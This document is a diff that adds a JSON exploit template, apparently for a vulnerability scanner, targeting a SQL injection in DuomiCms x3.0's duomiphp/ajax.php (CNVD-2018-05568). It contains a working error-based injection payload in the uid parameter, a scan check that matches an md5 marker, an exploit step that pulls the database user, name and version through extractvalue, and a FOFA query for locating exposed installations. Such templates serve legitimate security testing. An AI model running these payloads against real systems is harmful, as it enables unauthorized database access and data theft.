@@ -1,0 +1,89 @@
+{
+  "Name": "DuomiCms SQLi (CNVD-2018-05568)",
+  "Description": "DuomiCms x3.0 front end duomiphp/ajax.php file has SQL injection vulnerability. Attackers can use vulnerabilities to obtain sensitive information in the database.",
+  "Product": "DuomiCms",
+  "Homepage": "http://www.duomicms.net/",
+  "DisclosureDate": "2018-04-23",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"DuomiCms\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://xz.aliyun.com/t/2828"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "function",
+      "type": "createSelect",
+      "value": "user(),database(),version()",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(852963)))",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "be8a28444fe9b80595f92b8493fc4",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+  ],
+  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(0x3A,0x3A,{{{function}}}))",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|error: '(.*)' "
+                  ]
+            }
+  ],
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["DuomiCms"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": false
+}
